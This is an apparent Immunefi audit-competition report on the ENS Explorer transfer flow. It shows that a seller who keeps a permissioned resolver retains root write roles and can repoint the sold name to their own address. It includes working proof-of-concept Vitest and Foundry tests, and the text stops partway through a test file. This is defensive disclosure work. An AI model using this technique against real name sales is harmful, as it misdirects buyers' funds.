# 92263 w a medium a seller who keeps the resolver on a name transfer keeps root authority over the sold name and can repoint it at their own address after the sale

**Submitted on Sep 8th 2026 at 15:51:00 UTC by @sikoh for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92263
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Brief/Intro

After a name transfer in the Explorer that keeps the resolver, the account that sold the name can still rewrite the address that name resolves to, and the account that bought it cannot. The seller repoints it at an address they control at any time after being paid, so the application renders and resolves the buyer's name to the seller. It happens because the ERC-1155 transfer hands over the registry's roles by itself, in the registry's own transfer hook, while nothing hands over the resolver's and the transfer plan emits no step that would. Where the Explorer deployed that resolver for the seller in one click, the roles they keep sit at the root resource and reach every name it serves, including names the buyer points at it after the sale.

## Vulnerability Details

The Explorer's transfer flow moves the ERC-1155 token and, optionally, three pieces of configuration. The registry moves the name's authority along with the token by itself, in the transfer hook. The resolver has no equivalent, and nothing in the flow stands in for one, so on a permissioned resolver the account that sold the name keeps the permission that decides who may write its records.

`apps/portal/src/features/transfer/utils/buildTransferPlan.ts:27-40` builds the whole plan from three booleans:

```
    // Redundant once the resolver is detached, so only when the resolver is kept.
    if (options.setEthAddress && !options.detachResolver) {
      steps.push('set-eth-addr')
    }

    if (options.detachResolver) {
      steps.push('detach-resolver')
    }

    if (options.detachRegistry) {
      steps.push('detach-registry')
    }

    steps.push('transfer-token')
```

There are four possible steps and none of them touches a role. The file's own header explains the ordering with a statement that is true only of the registry's roles, `:1-5`:

```
  Config steps run before the token moves, since the sender loses the roles to
  make them once the ERC-1155 token transfers.
```

That sentence is true, and it is true because the registry makes it true. Contract source below is `github.com/ensdomains/contracts-v2` under `contracts/src`, pinned at `48b3e2d39513b9dd32ef1850877a29009bc807b9`. `registry/PermissionedRegistry.sol:485-496`:

```
  if (to != address(0) && from != address(0)) {
      // only transfers (skip mint and burn)
      for (uint256 i; i < tokenIds.length; ++i) {
          uint256 tokenId = tokenIds[i];
          // only check ROLE_CAN_TRANSFER_ADMIN on original owner (from)
          // ROLE_CAN_TRANSFER_ADMIN is technically a property of the token
          if (!hasRoles(tokenId, RegistryRolesLib.ROLE_CAN_TRANSFER_ADMIN, from)) {
              revert TransferDisallowed(tokenId, from);
          } else if (amounts[i] > 0) {
              _transferRoles(getResource(tokenId), from, to, false);
          }
      }
  }
```

and `_transferRoles` is a full handover, `access-control/EnhancedAccessControl.sol:235-241`:

```
  uint256 srcRoles = _roles[resource][srcAccount];
  if (srcRoles != 0) {
      // First revoke roles from source account to free up assignee slots
      _revokeRoles(resource, srcRoles, srcAccount, executeCallbacks);
      // Then grant roles to destination account
      _grantRoles(resource, srcRoles, dstAccount, executeCallbacks);
  }
```

So authority not surviving a transfer is a property this registry enforces on purpose, and guards: the same file regenerates the token whenever roles change so that the two cannot be separated, `:32-34`.

```
  ///   - `tokenVersionId`: incremented on unregister and whenever the token is regenerated (burn + mint)
  ///     due to role changes. Combined with the labelhash to form the ERC1155 token ID, ensuring
  ///     changes to roles create new tokens and prevent frontrunning a transfer with a role revocation.
```

Resolver roles are not registry roles. They are granted per account against a resource on the resolver contract, there is no hook of this kind on the resolver, and the transfer plan adds none, so moving the ERC-1155 token changes none of them. The repository says so itself, in the hook that decides who may edit, `apps/portal/src/features/records/hooks/useCanEditRecords.ts:38-40`:

```
  - Permissioned resolvers: authorized by resolver `ROLE_SET_*` (root or
    name-scoped). After a transfer that keeps the resolver, the previous owner
    typically retains these roles while the new token owner does not.
```

And that hook is the authority, `:113-116`:

```
  if (isPermissioned) return hasResolverRole

  // Public / non-permissioned resolvers: token owner can edit.
  return isOwner
```

So on a permissioned resolver the token owner is not the authority. The role holder is. After a transfer that keeps the resolver, the role holder is the seller.

The seller reaches that state with one click, and neither line of copy attached to it mentions authority. `apps/portal/src/features/transfer/components/SendNameForm.tsx:69-72` initialises all three options to `true`, which is the safe configuration. The option that turns this one off carries a description and a warning, `:46-52`:

```
  key: 'detachResolver',
  label: 'Detach the resolver',
  description:
    'Detaches this name’s resolver so it stops resolving to your records entirely. The recipient starts clean and sets up their
```

own.', warning: 'This name’s other records will keep resolving after the transfer. Until the recipient updates them, it could still be listed as the primary name for an address that no longer controls it.',

The description says what detaching does. The warning is what the seller reads when they turn detaching off, and it describes stale data: records that keep resolving until the recipient replaces them. Neither says that keeping the resolver also keeps the seller's permission to rewrite those records afterwards. The words role, permission, authority and revoke do not appear anywhere in that file.

## Impact Details

The seller can repoint the sold name at their own address after the sale, because the resolver never asks who owns the name.

The write path is gated on a role and nothing else. `resolver/PermissionedResolver.sol:665-671`:

```
  function setAddr(bytes32 node, uint256 coinType, bytes memory addressBytes)
      public
      onlyPartRoles(
          node,
          PermissionedResolverLib.partHash(coinType),
          PermissionedResolverLib.ROLE_SET_ADDR
      )
```

and that modifier consults the resolver's own role tables and nothing else, `:178-187`:

```
  modifier onlyPartRoles(bytes32 node, bytes32 part, uint256 roleBitmap) {
      if (
          part == bytes32(0) ||
          (!hasRoles(PermissionedResolverLib.resource(node, part), roleBitmap, msg.sender) &&
              !hasRoles(PermissionedResolverLib.resource(0, part), roleBitmap, msg.sender))
      ) {
          _checkRoles(PermissionedResolverLib.resource(node, 0), roleBitmap, msg.sender); // reverts using "widest" resource
      }
      _;
  }
```

There is no registry lookup and no owner check in it. Whoever holds `ROLE_SET_ADDR` writes `addr(60)`, the address the name resolves to and therefore the address anyone paying that name pays.

How far the seller's roles reach depends on who deployed the resolver, and the Explorer deploys it for whoever clicks, with every role. `apps/portal/src/features/resolver/utils/permissionedResolver.ts:39-44`:

```
  export const getResolverInitCalldata = (ownerAddress: Address): Hex => {
    return encodeFunctionData({
      abi: permissionedResolverInitAbi,
      functionName: 'initialize',
      args: [ownerAddress, permissionedResolverRoleBitmap, []],
```

`:21-23` supplies the bitmap it passes, `0x1111111111111111111111111111111111111111111111111111111111111111`, and `apps/portal/src/features/resolver/hooks/useDeployPermissionedResolver.ts:68` supplies the account it names admin: `getResolverInitCalldata(from)`, the connected wallet. That bitmap is `ALL_ROLES` in the protocol's own library, `access-control/libraries/EACBaseRolesLib.sol:19-20`.

The resolver grants it at the root resource, not against a name. `resolver/PermissionedResolver.sol:234-241`:

```
  function initialize(address admin, uint256 roleBitmap, bytes[] calldata setters)
      external
      initializer
  {
      __UUPSUpgradeable_init();
      _grantRoles(ROOT_RESOURCE, roleBitmap, admin, false);
```

A root role counts on every resource, `access-control/EnhancedAccessControl.sol:453-455`:

```
  function _effectiveRoles(uint256 resource, address account) private view returns (uint256) {
      return _getRoles(ROOT_RESOURCE, account) | _getRoles(resource, account);
  }
```

and both functions the modifier above calls resolve through it, `:185-191`. So a seller who deployed the resolver does not merely keep write access to the name they sold. They keep it over every name that resolver serves, including any the buyer points at it after the sale.

The same bitmap carries the role that replaces the code, `resolver/PermissionedResolver.sol:747-752`:

```
  /// @dev Allow `ROLE_UPGRADE` to upgrade.
  function _authorizeUpgrade(address newImplementation)
      internal
      override
      onlyRootRoles(PermissionedResolverLib.ROLE_UPGRADE)
```

so the seller can also replace the implementation behind all of those names.

Ticking "Point the ETH address at the recipient" does not close this. That step writes `addr(60)` once, during the transfer, through the same resolver the seller still controls, and the seller can write it again the next block or a year later. Nothing about the transfer expires the role, and nothing in the flow asks the seller to give it up.

The buyer has no counter-move on that resolver. Opening the record editor on the name they just paid for, `useCanEditRecords` resolves `isPermissioned` true, asks the resolver whether the connected wallet holds `ROLE_SET_*` for it, gets false, and returns `canEdit: false`. So for as long as the name points where it pointed at the sale, the only account that can write its address record is the one that sold it.

Two things bound this rather than remove it, and both are measured in the proof of concept rather than asserted. The buyer can recover: the registry hands them `ROLE_SET_RESOLVER` as part of the transfer, so they can point the name at a fresh resolver and start over. And the option is on by default, so keeping the resolver is a seller-chosen state rather than an accident of the flow. What the flow does not do is make that choice legible: it offers the option under a description of a different consequence, it never revokes on the way out, and it gives the buyer no signal that a previous owner still holds write access to the name they now own.

## References

Asset, Explorer app, branch `audit-comp-ready`, commit `1c9b47f18fcddd2e864dfe385c4171061c9811ae`:

* `apps/portal/src/features/transfer/utils/buildTransferPlan.ts`
* `apps/portal/src/features/transfer/components/SendNameForm.tsx`
* `apps/portal/src/features/records/hooks/useCanEditRecords.ts`
* `apps/portal/src/features/resolver/utils/permissionedResolver.ts`
* `apps/portal/src/features/resolver/hooks/useDeployPermissionedResolver.ts`

Contracts read for the mechanism, `github.com/ensdomains/contracts-v2`, commit `48b3e2d39513b9dd32ef1850877a29009bc807b9`, under `contracts/src`:

* `registry/PermissionedRegistry.sol`
* `access-control/EnhancedAccessControl.sol`
* `access-control/libraries/EACBaseRolesLib.sol`
* `resolver/PermissionedResolver.sol`

The three proof-of-concept files are reproduced in full in the Proof of Concept section, so this report is self-contained and needs no attachment.

## Recommendation

Make the transfer plan move authority on the resolver the way the registry already moves it on the token. When the resolver is kept, add a step that revokes the sender's `ROLE_SET_*` on that name and grants them to the recipient, in the config phase where the sender still holds them:

```
  if (options.detachResolver) {
    steps.push('detach-resolver')
  } else {
    steps.push('transfer-resolver-roles')
  }
  steps.push('transfer-token')
```

That step cannot be complete when the sender's grant sits at the root resource, since revoking it there would strip their authority over every other name on the same resolver. For that case the honest fix is to refuse the combination: when the sender holds the role at root rather than on the name, keeping the resolver should be blocked, or the name moved to a resolver the sender does not administer.

Failing that, at minimum say what the option costs. The copy at `SendNameForm.tsx:51` should state that keeping the resolver also keeps the sender's permission to change these records, and the record editor should tell a token owner who has no role why they cannot edit and who can.

## Proof of Concept

## Proof of Concept

Three parts, from two clean clones. The first measures what the transfer plan moves and what the app tells the seller. The second performs one ordinary transfer of a normally registered name and reads both contracts afterwards. The third takes the state the plan leaves behind and reads who can still write the record. I ran all three as written on a machine that had neither repository checked out.

The app side is `transfer-keeps-seller-write-authority.poc.test.ts`. It imports the shipped `buildTransferPlan` and reads the shipped source of the form and the hook.

```
git clone https://github.com/immunefi-team/audit-comp-ens && cd audit-comp-ens
git checkout 1c9b47f18fcddd2e864dfe385c4171061c9811ae
corepack enable && pnpm install --frozen-lockfile
cp <attached>/transfer-keeps-seller-write-authority.poc.test.ts apps/portal/src/
pnpm --filter portal exec vitest run --reporter=verbose \
  src/transfer-keeps-seller-write-authority.poc.test.ts --pool=threads --no-file-parallelism
```

Output as I ran it:

```
✓ POSITIVE CONTROL: the safe default detaches the resolver
✓ DEFECT: with the resolver kept, the plan is a bare token move
✓ and no combination of the three options ever produces a revoke step
✓ the plan file states the sender loses roles, but only the TOKEN roles
✓ the copy for keeping the resolver warns about STALE DATA
✓ DEFECT: and never that the sender keeps permission to rewrite them
✓ the repo documents that the previous owner keeps the roles
✓ and on a permissioned resolver ownership stops being the authority
✓ so the buyer, who owns the token and holds no role, cannot edit
✓ the Explorer deploys the resolver with the caller as admin
✓ and the bitmap it passes is ALL_ROLES
✓ the initialiser takes an owner and a bitmap, so the scope is not a name
✓ CONTROL: the one-click deploy is the same path a seller would use

Test Files  1 passed (1)
     Tests  13 passed (13)
```

The third case enumerates all eight combinations of the three options and collects every step the planner can emit. The set is exactly `detach-registry`, `detach-resolver`, `set-eth-addr`, `transfer-token`; there is no input that makes it revoke anything.

The chain side is two files against the contracts at the pinned commit. `C022TransferAsymmetry.t.sol` registers a name with the role set the `ETHRegistrar` grants at registration, imported from the registrar rather than retyped, points it at a resolver the seller deployed, and then performs the single ERC-1155 transfer that is the entire plan when the resolver is kept. `C022SellerKeepsAuthority.t.sol` takes the resulting state and exercises it.

```
git clone --recursive https://github.com/ensdomains/contracts-v2 && cd contracts-v2
git checkout 48b3e2d39513b9dd32ef1850877a29009bc807b9 && git submodule update --init --recursive
cp <attached>/C022TransferAsymmetry.t.sol <attached>/C022SellerKeepsAuthority.t.sol \
  contracts/test/unit/resolver/
cd contracts && forge test --match-path 'test/unit/resolver/C022*.t.sol' -vv
```

Output as I ran it, against `48b3e2d`:

```
[PASS] test_CONTROL_every_registry_role_moves_with_the_token()
  registry moved the entire role bitmap: 97409655027181761882228017414928043058140282880

[PASS] test_CONTROL_the_buyer_can_point_the_name_at_a_fresh_resolver()
  buyer re-pointed the name at a resolver they administer

[PASS] test_the_token_transfer_moves_registry_authority_but_not_resolver_authority()
  registry ROLE_SET_RESOLVER  seller after: false
  registry ROLE_SET_RESOLVER  buyer  after: true
  resolver ROLE_SET_ADDR      seller after: true
  resolver ROLE_SET_ADDR      buyer  after: false
  after the sale alice.eth resolves to the seller: 0xDFa97bfe5d2b2E8169b194eAA78Fbb793346B174

Suite result: ok. 3 passed; 0 failed; 0 skipped

[PASS] test_CONTROL_an_account_without_the_grant_cannot_write()
  CONTROL stranger cannot write the record

[PASS] test_CONTROL_revoking_the_root_grant_stops_the_same_call()
  CONTROL with the root grant revoked, the seller's write reverts

[PASS] test_seller_can_replace_the_implementation()
  seller replaced the implementation behind every name on the resolver

[PASS] test_seller_can_write_a_name_the_buyer_adds_afterwards()
  savings.bob.eth, pointed at this resolver later, is writable by the seller

[PASS] test_seller_repoints_the_sold_name_after_the_sale()
  --- token transferred to the buyer; no resolver call in the plan ---
  buyer (token owner, no role) cannot write the record
  alice.eth now resolves to the seller after the sale: 0xDFa97bfe5d2b2E8169b194eAA78Fbb793346B174

[PASS] test_the_apps_hardcoded_bitmap_is_ALL_ROLES()

Suite result: ok. 6 passed; 0 failed; 0 skipped
```

The four controls are the load-bearing part. The registry moves the whole registration bitmap, not just the one role I read, so the handover on that side is the rule and not an artefact of which role I picked. The buyer really can re-point the name, which is the bound I state above rather than one you have to take on trust. An account that never received the resolver grant cannot make the call. And the seller's own write reverts once the root grant is revoked, with the same arguments against the same node, so what the other tests measure is the retained grant and not a permissive deployment.

What is real and what is harnessed. `buildTransferPlan` is the shipped function, imported and executed. `SendNameForm.tsx`, `buildTransferPlan.ts`, `permissionedResolver.ts`, `useDeployPermissionedResolver.ts` and `useCanEditRecords.ts` are read from disk and quoted rather than characterised. The registry, the resolver, the factory, the registration role bitmap and the initialiser calldata in the Foundry tests are the real contracts and the real constants at the pinned commit, and the transfer is a plain `safeTransferFrom` rather than an exposed internal. The name is registered directly against the registry rather than through the commit-reveal registrar, which is why the label is registered as `alice` while the resolver is keyed on the namehash of `alice.eth`; the registrar's role bitmap is imported so the roles under test are the ones a real registration grants. The one step I did not execute is a buyer paying the repointed address.

The three files in full, so nothing here depends on an attachment. Save each under the name in its heading and run the commands above.

### transfer-keeps-seller-write-authority.poc.test.ts

```ts
/**
 * After a transfer that keeps the resolver, the SELLER keeps the resolver roles
 * and the BUYER gets none, so the buyer cannot edit the records of the name they
 * just bought and the seller still can.
 *
 * Everything below is read from the shipped source or driven through the shipped
 * pure helpers. No chain is needed: the claim is about which authority the app's
 * own transfer plan moves, and it moves none.
 */
import { readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import { buildTransferPlan } from './features/transfer/utils/buildTransferPlan'

const SRC = dirname(fileURLToPath(new URL('file://' + __filename)))
// Normalised so the assertions that span a newline hold on a CRLF checkout too
// (git's `core.autocrlf=true` default on Windows rewrites the working tree).
const read = (rel: string) =>
  readFileSync(join(SRC, rel), 'utf-8').replace(/\r\n/g, '\n')

describe('the transfer plan moves the token and nothing about authority', () => {
  it('POSITIVE CONTROL: the safe default detaches the resolver', () => {
    // SendNameForm initialises every option to true.
    const form = read('features/transfer/components/SendNameForm.tsx')
    expect(form).toContain('setEthAddress: true,')
    expect(form).toContain('detachResolver: true,')
    expect(form).toContain('detachRegistry: true,')

    const safe = buildTransferPlan({
      setEthAddress: true,
      detachResolver: true,
      detachRegistry: true,
    })
    expect(safe).toEqual(['detach-resolver', 'detach-registry', 'transfer-token'])
  })

  it('DEFECT: with the resolver kept, the plan is a bare token move', () => {
    const kept = buildTransferPlan({
      setEthAddress: true,
      detachResolver: false,
      detachRegistry: false,
    })
    expect(kept).toEqual(['set-eth-addr', 'transfer-token'])
    // no step revokes anything
    expect(kept.some((s) => /revoke|role/i.test(s))).toBe(false)
  })

  it('and no combination of the three options ever produces a revoke step', () => {
    const produced = new Set<string>()
    for (const a of [true, false]) {
      for (const b of [true, false]) {
        for (const c of [true, false]) {
          for (const step of buildTransferPlan({
            setEthAddress: a,
            detachResolver: b,
            detachRegistry: c,
          })) {
            produced.add(step)
          }
        }
      }
    }
    expect([...produced].sort()).toEqual([
      'detach-registry',
      'detach-resolver',
      'set-eth-addr',
      'transfer-token',
    ])
    expect(produced.has('revoke-roles')).toBe(false)
  })

  it('the plan file states the sender loses roles, but only the TOKEN roles', () => {
    const plan = read('features/transfer/utils/buildTransferPlan.ts')
    expect(plan).toContain(
      'the sender loses the roles to\n * make them once the ERC-1155 token transfers',
    )
  })
})

describe('what the app tells the seller, and what it leaves out', () => {
  const form = read('features/transfer/components/SendNameForm.tsx')

  it('the copy for keeping the resolver warns about STALE DATA', () => {
    expect(form).toContain(
      'This name’s other records will keep resolving after the transfer.',
    )
    expect(form).toContain(
      'it could still be listed as the primary name for an address that no longer controls it',
    )
  })

  it('DEFECT: and never that the sender keeps permission to rewrite them', () => {
    const lower = form.toLowerCase()
    expect(lower).not.toContain('role')
    expect(lower).not.toContain('permission')
    expect(lower).not.toContain('authority')
    expect(lower).not.toContain('revoke')
  })
})

describe('the consequence, stated by the app itself', () => {
  const canEdit = read('features/records/hooks/useCanEditRecords.ts')

  it('the repo documents that the previous owner keeps the roles', () => {
    const prose = canEdit.replace(/\n\s*\*\s*/g, ' ')
    expect(prose).toContain(
      'After a transfer that keeps the resolver, the previous owner typically retains these roles while the new token owner does not.',
    )
  })

  it('and on a permissioned resolver ownership stops being the authority', () => {
    expect(canEdit).toContain('if (isPermissioned) return hasResolverRole')
    expect(canEdit).toContain('return isOwner')
  })

  it('so the buyer, who owns the token and holds no role, cannot edit', () => {
    // Reproduce the shipped decision with the two facts the docstring states.
    const decide = (isPermissioned: boolean, hasResolverRole: boolean, isOwner: boolean) =>
      isPermissioned ? hasResolverRole : isOwner

    // buyer: owns the token, holds no resolver role
    expect(decide(true, false, true)).toBe(false)
    // seller: no longer owns the token, still holds the role
    expect(decide(true, true, false)).toBe(true)

    // CONTROL: on a non-permissioned resolver the token owner is the authority,
    // so the divergence is a property of the permissioned path, not of the test.
    expect(decide(false, false, true)).toBe(true)
    expect(decide(false, true, false)).toBe(false)
  })
})

describe('the roles the seller keeps are held at the resolver ROOT, not on one name', () => {
  const init = read('features/resolver/utils/permissionedResolver.ts')

  it('the Explorer deploys the resolver with the caller as admin', () => {
    expect(init).toContain(
      'export const getResolverInitCalldata = (ownerAddress: Address): Hex => {',
    )
    expect(init).toContain("functionName: 'initialize',")
    expect(init).toContain('args: [ownerAddress, permissionedResolverRoleBitmap, []],')
  })

  it('and the bitmap it passes is ALL_ROLES', () => {
    expect(init).toContain(
      "'0x1111111111111111111111111111111111111111111111111111111111111111',",
    )
  })

  it('the initialiser takes an owner and a bitmap, so the scope is not a name', () => {
    expect(init).toContain(
      "'function initialize(address owner, uint256 bitmap, bytes[] setters)',",
    )
  })

  it('CONTROL: the one-click deploy is the same path a seller would use', () => {
    const hook = read('features/resolver/hooks/useDeployPermissionedResolver.ts')
    expect(hook).toContain('getResolverInitCalldata(from)')
    expect(hook).toContain("functionName: 'deployProxy',")
  })
})
```

### C022TransferAsymmetry.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// The asymmetry the Explorer's transfer flow does not compensate for.
//
// PermissionedRegistry._update calls _transferRoles on every token transfer, so the registry
// hands the name's authority to the new owner as part of the move. The resolver has no such
// hook, and buildTransferPlan emits no step that stands in for one. This file performs one
// ordinary ERC-1155 transfer of a normally registered name and reads both sides afterwards.

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {COIN_TYPE_ETH} from "@ens/contracts/utils/ENSIP19.sol";

import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";
import {PermissionedRegistry} from "~src/registry/PermissionedRegistry.sol";
import {RegistryRolesLib} from "~src/registry/libraries/RegistryRolesLib.sol";
import {REGISTRATION_ROLE_BITMAP} from "~src/registrar/ETHRegistrar.sol";
import {IRegistry} from "~src/registry/interfaces/IRegistry.sol";
import {IContractNamer} from "~src/reverse-registrar/interfaces/IContractNamer.sol";
import {LabelStore} from "~src/utils/LabelStore.sol";

contract C022TransferAsymmetryTest is Test {
    VerifiableFactory factory;
    PermissionedResolver implementation;
    PermissionedResolver resolver;
    PermissionedRegistry registry;
    LabelStore labelStore;

    address seller = makeAddr("seller");
    address buyer = makeAddr("buyer");

    string constant LABEL = "alice";
    bytes32 soldNode;
    uint256 tokenId;

    function setUp() external {
        // The resolver the seller deployed through the Explorer: caller as admin, ALL_ROLES,
        // granted at ROOT_RESOURCE. Same calldata shape as getResolverInitCalldata(from).
        factory = new VerifiableFactory();
        implementation = new PermissionedResolver(address(this));
        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize,
            (seller, EACBaseRolesLib.ALL_ROLES, new bytes[](0))
        );
        resolver = PermissionedResolver(
            factory.deployProxy(address(implementation), uint256(keccak256(initData)), initData)
        );

        // A normally registered .eth name: the role set the ETHRegistrar grants at registration,
        // imported from the registrar rather than retyped here.
        labelStore = new LabelStore(IContractNamer(address(0)));
        registry = new PermissionedRegistry(labelStore, address(this), EACBaseRolesLib.ALL_ROLES);
        tokenId = registry.register(
            LABEL,
            seller,
            IRegistry(address(0)),
            address(resolver),
            REGISTRATION_ROLE_BITMAP,
            uint64(block.timestamp + 365 days)
        );

        soldNode = NameCoder.namehash(NameCoder.encode("alice.eth"), 0);
    }

    function _hasRegistryRole(address who, uint256 role) internal view returns (bool) {
        return registry.roles(tokenId, who) & role != 0;
    }

    function _hasResolverRole(address who, uint256 role) internal view returns (bool) {
        return resolver.hasRoles(resolver.ROOT_RESOURCE(), role, who);
    }

    /// One transfer. The registry moves its authority; the resolver keeps the seller's.
    function test_the_token_transfer_moves_registry_authority_but_not_resolver_authority()
        external
    {
        // Before: the seller holds both sides.
        assertTrue(_hasRegistryRole(seller, RegistryRolesLib.ROLE_SET_RESOLVER), "pre registry");
        assertTrue(
            _hasResolverRole(seller, PermissionedResolverLib.ROLE_SET_ADDR), "pre resolver"
        );
        vm.prank(seller);
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(seller));

        // The sale: one ordinary ERC-1155 transfer, which is every step the plan emits when
        // "Detach the resolver" is left unchecked.
        vm.prank(seller);
        registry.safeTransferFrom(seller, buyer, tokenId, 1, "");
        assertEq(registry.ownerOf(tokenId), buyer, "buyer owns the name");

        // Registry side: authority followed the token, in both directions.
        bool sellerKeptRegistry = _hasRegistryRole(seller, RegistryRolesLib.ROLE_SET_RESOLVER);
        bool buyerGotRegistry = _hasRegistryRole(buyer, RegistryRolesLib.ROLE_SET_RESOLVER);
        console.log("registry ROLE_SET_RESOLVER  seller after:", sellerKeptRegistry);
        console.log("registry ROLE_SET_RESOLVER  buyer  after:", buyerGotRegistry);
        assertFalse(sellerKeptRegistry, "registry: seller lost it");
        assertTrue(buyerGotRegistry, "registry: buyer gained it");

        // Resolver side: nothing moved.
        bool sellerKeptResolver = _hasResolverRole(seller, PermissionedResolverLib.ROLE_SET_ADDR);
        bool buyerGotResolver = _hasResolverRole(buyer, PermissionedResolverLib.ROLE_SET_ADDR);
        console.log("resolver ROLE_SET_ADDR      seller after:", sellerKeptResolver);
        console.log("resolver ROLE_SET_ADDR      buyer  after:", buyerGotResolver);
        assertTrue(sellerKeptResolver, "resolver: seller kept it");
        assertFalse(buyerGotResolver, "resolver: buyer got nothing");

        // And the difference is not academic: the seller writes the record, the buyer cannot.
        vm.prank(buyer);
        vm.expectRevert();
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(buyer));

        vm.prank(seller);
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(seller));
        assertEq(
            resolver.addr(soldNode, COIN_TYPE_ETH),
            abi.encodePacked(seller),
            "the sold name resolves to the seller"
        );
        console.log("after the sale alice.eth resolves to the seller:", seller);
    }

    /// The registry's handover is wholesale and deliberate, not a side effect of this one role.
    function test_CONTROL_every_registry_role_moves_with_the_token() external {
        uint256 before_ = registry.roles(tokenId, seller);
        assertEq(before_, REGISTRATION_ROLE_BITMAP, "seller starts with the registration set");

        vm.prank(seller);
        registry.safeTransferFrom(seller, buyer, tokenId, 1, "");

        assertEq(registry.roles(tokenId, seller), 0, "seller keeps no registry role");
        assertEq(registry.roles(tokenId, buyer), before_, "buyer receives the whole set");
        console.log("registry moved the entire role bitmap:", before_);
    }

    /// The buyer's recovery, stated in the report as a bound: they can re-point the name.
    function test_CONTROL_the_buyer_can_point_the_name_at_a_fresh_resolver() external {
        vm.prank(seller);
        registry.safeTransferFrom(seller, buyer, tokenId, 1, "");

        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize,
            (buyer, EACBaseRolesLib.ALL_ROLES, new bytes[](0))
        );
        PermissionedResolver fresh = PermissionedResolver(
            factory.deployProxy(address(implementation), uint256(keccak256(initData)), initData)
        );

        vm.prank(buyer);
        registry.setResolver(tokenId, address(fresh));
        console.log("buyer re-pointed the name at a resolver they administer");

        vm.prank(buyer);
        fresh.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(buyer));
        assertEq(fresh.addr(soldNode, COIN_TYPE_ETH), abi.encodePacked(buyer), "buyer recovers");
    }
}
```

### C022SellerKeepsAuthority.t.sol

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

// On-chain confirmation for the Explorer transfer flow that keeps the resolver.
//
// The Explorer deploys a PermissionedResolver for whoever clicks the button, passing
// `initialize(<caller>, 0x1111...1111, [])` (apps/portal/src/features/resolver/utils/
// permissionedResolver.ts:21-23,39-44). When that account later transfers the name and
// leaves "Detach the resolver" unchecked, `buildTransferPlan` emits no step that touches
// a role. This file plays that sequence against a real resolver deployed through the real
// VerifiableFactory and reads who can still write the name's address record.

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

import {VerifiableFactory} from "@ensdomains/verifiable-factory/VerifiableFactory.sol";
import {NameCoder} from "@ens/contracts/utils/NameCoder.sol";
import {COIN_TYPE_ETH} from "@ens/contracts/utils/ENSIP19.sol";

import {EACBaseRolesLib} from "~src/access-control/libraries/EACBaseRolesLib.sol";
import {PermissionedResolverLib} from "~src/resolver/libraries/PermissionedResolverLib.sol";
import {PermissionedResolver} from "~src/resolver/PermissionedResolver.sol";

contract C022SellerKeepsAuthorityTest is Test {
    VerifiableFactory factory;
    PermissionedResolver implementation;
    PermissionedResolver resolver;

    address seller = makeAddr("seller");
    address buyer = makeAddr("buyer");
    address stranger = makeAddr("stranger");

    // The literal the Explorer hardcodes, copied from permissionedResolver.ts:21-23.
    uint256 constant APP_BITMAP =
        0x1111111111111111111111111111111111111111111111111111111111111111;

    bytes soldName;
    bytes32 soldNode;
    bytes laterName;
    bytes32 laterNode;

    function setUp() external {
        factory = new VerifiableFactory();
        implementation = new PermissionedResolver(address(this));

        // Exactly the calldata `getResolverInitCalldata(from)` builds, with `from` = the
        // account that clicked deploy. In the flow below that account is the seller.
        bytes memory initData = abi.encodeCall(
            PermissionedResolver.initialize, (seller, APP_BITMAP, new bytes[](0))
        );
        resolver = PermissionedResolver(
            factory.deployProxy(address(implementation), uint256(keccak256(initData)), initData)
        );

        soldName = NameCoder.encode("alice.eth");
        soldNode = NameCoder.namehash(soldName, 0);
        laterName = NameCoder.encode("savings.bob.eth");
        laterNode = NameCoder.namehash(laterName, 0);
    }

    /// The bitmap the app hardcodes is the protocol's ALL_ROLES, so the one-click deploy
    /// grants every role at ROOT_RESOURCE, not a write role on one name.
    function test_the_apps_hardcoded_bitmap_is_ALL_ROLES() external pure {
        assertEq(APP_BITMAP, EACBaseRolesLib.ALL_ROLES, "app bitmap == ALL_ROLES");
    }

    /// The whole finding in one sequence: sell the name, keep the resolver, then rewrite
    /// the address the name pays to.
    function test_seller_repoints_the_sold_name_after_the_sale() external {
        // Before the sale the seller sets the record, as any owner would.
        vm.prank(seller);
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(seller));

        // The sale. `buildTransferPlan({detachResolver: false, detachRegistry: false})`
        // emits ['transfer-token'] alone, so nothing here touches the resolver: the
        // ERC-1155 token moves and no role does. There is nothing to replay.
        console.log("--- token transferred to the buyer; no resolver call in the plan ---");

        // The buyer owns the name. The resolver never asks who owns it.
        vm.prank(buyer);
        vm.expectRevert();
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(buyer));
        console.log("buyer (token owner, no role) cannot write the record");

        // The seller owns nothing and writes it anyway.
        vm.prank(seller);
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(seller));

        bytes memory resolved = resolver.addr(soldNode, COIN_TYPE_ETH);
        assertEq(resolved, abi.encodePacked(seller), "sold name resolves to the seller");
        console.log("alice.eth now resolves to the seller after the sale:", seller);
    }

    /// The grant is at ROOT_RESOURCE, so it is not confined to the name that was sold.
